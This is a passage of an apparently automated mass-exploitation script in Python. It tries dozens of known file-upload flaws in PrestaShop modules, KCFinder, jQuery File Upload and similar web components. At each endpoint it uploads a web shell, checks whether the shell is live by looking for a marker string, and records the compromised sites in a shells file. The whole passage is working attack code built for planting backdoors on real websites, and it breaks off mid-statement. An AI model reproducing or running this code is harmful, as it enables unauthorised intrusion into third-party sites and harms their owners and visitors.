			print '\033[92m[>] \033[0mExploit Leosliderlayer    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 22 leosliderlayer2
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/leosliderlayer2/upload_images.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/leosliderlayer2/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Leosliderlayer2    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/leosliderlayer/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Leosliderlayer2    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 23 vtemskitter
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/vtemskitter/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/vtemskitter/img/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Vtemskitter    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/vtemskitter/img/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Vtemskitter    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 24 additionalproductstabs
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/additionalproductstabs/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/additionalproductstabs/file_uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Additionalproductstabs    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/additionalproductstabs/file_uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Additionalproductstabs    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 25 addthisplugin
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/addthisplugin/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/addthisplugin/file_uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Addthisplugin    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/addthisplugin/file_uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Addthisplugin    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 26 attributewizardpro
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/attributewizardpro/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/attributewizardpro/file_uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Attributewizardpro    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/attributewizardpro/file_uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Attributewizardpro    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 27 Attributewizardpro old
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/attributewizardpro.OLD/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/attributewizardpro.OLD/file_uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Attributewizardpro old    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/attributewizardpro.OLD/file_uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Attributewizardpro old    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 28 1attributewizardpro
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/1attributewizardpro/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/1attributewizardpro/file_uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Lttributewizardpro    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/1attributewizardpro/file_uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Lattributewizardpro    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 29 attributewizardpro_x
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/attributewizardpro_x/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/attributewizardpro_x/file_uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Attributewizardpro_x    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/attributewizardpro_x/file_uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Attributewizardpro_x    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 30 advancedslider
		
		bReflexup = {'qqfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/advancedslider/uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit advancedslider    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/advancedslider/uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit advancedslider    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 31 cartabandonmentpro
		
		bReflexup = {'image' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/cartabandonmentpro/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/cartabandonmentpro/uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit cartabandonmentpro    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/cartabandonmentpro/uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit cartabandonmentpro    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 32 cartabandonmentproOld
		
		bReflexup = {'image' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/cartabandonmentproOld/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/cartabandonmentproOld/uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit cartabandonmentpro old    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/cartabandonmentproOld/uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit cartabandonmentpro old   \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 33 videostab
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/videostab/uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit videostab   \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/videostab/uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit videostab   \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 34 fieldvmegamenu
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/fieldvmegamenu/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/fieldvmegamenu/uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Fieldvmegamenu   \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/fieldvmegamenu/uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Fieldvmegamenu   \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 35 orderfiles
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/orderfiles/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/orderfiles/files/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Orderfiles   \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/orderfiles/files/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Orderfiles   \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 36 pk_flexmenu
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/pk_flexmenu/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/pk_flexmenu/uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit pk_flexmenu   \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/pk_flexmenu/uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit pk_flexmenu   \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 37 pk_flexmenu_old
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/pk_flexmenu_old/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/pk_flexmenu_old/uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit pk_flexmenu Old   \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/pk_flexmenu_old/uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit pk_flexmenu Old  \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 38 pk_vertflexmenu
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/pk_vertflexmenu/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/pk_vertflexmenu/uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit pk_vertflexmenu  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/pk_vertflexmenu/uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit pk_vertflexmenu  \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 39 nvn_export_orders
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/nvn_export_orders/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/nvn_export_orders/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit nvn_export_orders  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/nvn_export_orders/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit nvn_export_orders  \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 40 tdpsthemeoptionpanel
		
		bReflexup = {'image_upload' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/tdpsthemeoptionpanel/upload/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit tdpsthemeoptionpanel  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/tdpsthemeoptionpanel/upload/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit tdpsthemeoptionpanel  \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 41 psmodthemeoptionpanel
		
		bReflexup = {'image_upload' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/psmodthemeoptionpanel/upload/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Psmodthemeoptionpanel  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/psmodthemeoptionpanel/upload/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Psmodthemeoptionpanel  \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 42 masseditproduct
		
		bReflexup = {'file' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/lib/redactor/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/masseditproduct/uploads/file/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit masseditproduct  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/masseditproduct/uploads/file/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit masseditproduct  \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 43 blocktestimonial
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/blocktestimonial/addtestimonial.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/upload/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit blocktestimonial  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/upload/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit blocktestimonial  \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
		# mod_simplefileuploadv1
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/mod_simplefileuploadv1.3/elements/udd.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/mod_simplefileuploadv1.3/elements/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit mod_simplefileupload  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/mod_simplefileuploadv1.3/elements/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit mod_simplefileupload  \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
			
	
			
    except:
        pass

def Unknown(url):

	try:
        
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/assets/ckeditor/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/assets/ckeditor/kcfinder/upload/files/up.php.jd")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Kcfinder1  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/assets/ckeditor/kcfinder/upload/files/up.php.jd'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Kcfinder1  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


			
	
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/assets/admin/ckeditor/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/assets/admin/ckeditor/kcfinder/upload/files/up.php.jd")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Kcfinder2  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/assets/admin/ckeditor/kcfinder/upload/files/up.php.jd'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Kcfinder2  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


			
	
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/assets/plugins/ckeditor/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/assets/plugins/ckeditor/kcfinder/upload/files/up.php.jd")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Kcfinder3 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/assets/plugins/ckeditor/kcfinder/upload/files/up.php.jd'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Kcfinder3  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

			
	
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/admin/ckeditor/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/admin/ckeditor/kcfinder/upload/files/up.php.jd")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Kcfinder4 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/admin/ckeditor/kcfinder/upload/files/up.php.jd'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Kcfinder4  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			


			
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/libraries/jscripts/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/libraries/jscripts/kcfinder/upload/files/up.php.jd")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Kcfinder5 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/libraries/jscripts/kcfinder/upload/files/up.php.jd'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Kcfinder5  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


			
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/ckeditor/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/ckeditor/kcfinder/upload/files/up.php.jd")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Kcfinder6 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/ckeditor/kcfinder/upload/files/up.php.jd'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Kcfinder6  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

			
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/js/ckeditor/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/js/ckeditor/kcfinder/upload/files/up.php.jd")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Kcfinder7 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/js/ckeditor/kcfinder/upload/files/up.php.jd'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Kcfinder7  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

			
			
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/scripts/jquery/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/scripts/jquery/kcfinder/upload/files/up.php.jd")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Kcfinder8 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/scripts/jquery/kcfinder/upload/files/up.php.jd'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Kcfinder8  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

			
			
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/kcfinder-2.51/upload.php', files=files)

		
		
		lib = requests.get(url+"/kcfinder-2.51/upload/files/up.php.jd")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Kcfinder9 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/kcfinder-2.51/upload/files/up.php.jd'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Kcfinder9  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)			

			
			
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/assets/js/mylibs/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/assets/js/mylibs/kcfinder/upload/files/up.php.jd")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Kcfinder10 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/assets/js/mylibs/kcfinder/upload/files/up.php.jd'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Kcfinder10  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)			
			
				

		
		files = {'files[]' : (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/tpl/plugins/upload9.1.0/server/php/', files=files)

		
		lib = requests.get(url+'/tpl/plugins/upload9.1.0/server/php/')

		if '{"files":' in lib.content:
			print '\033[92m[>] \033[0mExploit Htmcss \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/tpl/plugins/upload9.1.0/server/php/'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Htmcss  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
	
						

		
		files = {'files[]' : (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/themes/dashboard/assets/plugins/jquery-file-upload/server/php/', files=files)

		
		lib = requests.get(url+'/tpl/plugins/upload9.1.0/server/php/up.php')

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit BuilderEngine \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/themes/dashboard/assets/plugins/jquery-file-upload/server/php/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit BuilderEngine  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			

	
		
		files = {'files[]': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/server/php/', files=files)

		
		
		lib = requests.get(url+"/server/php/files/up.php")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Arrayfiles \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/server/php/files/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Arrayfiles  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
			


		
		files = {'files[]': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/adminside/server/php/', files=files)

		
		
		lib = requests.get(url+"/images/block/up.php")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Design Factory \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/images/block/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Design Factory  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
			

		
		
		files = {'files[]': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/vehiculo_photos/server/php/', files=files)

		
		
		lib = requests.get(url+"/vehiculo_photos/server/php/files/up.php")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit vehiculo \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/vehiculo_photos/server/php/files/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit vehiculo  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
			

		
		
		files = {'files[]': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/tpl/plugins/upload9.1.0/server/php/', files=files)

		
		
		lib = requests.get(url+"/tpl/plugins/upload9.1.0/server/php/files/up.php")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit upload9.1.0 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/tpl/plugins/upload9.1.0/server/php/files/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit upload9.1.0  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			

		
		
		files = {'files[]': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/public/upload_nhieuanh/server/php/_index.php', files=files)

		
		
		lib = requests.get(url+"/public/upload_nhieuanh/server/php/files/up.php")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Filecms \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/public/upload_nhieuanh/server/php/files/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Filecms  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		
		files = {'files[]': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/assets/global/plugins/jquery-file-upload/server/php/', files=files)

		
		lib = requests.get(url+"/assets/global/plugins/jquery-file-upload/server/php/files/up.php")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit jquery \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/assets/global/plugins/jquery-file-upload/server/php/files/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit jquery  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
			

		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

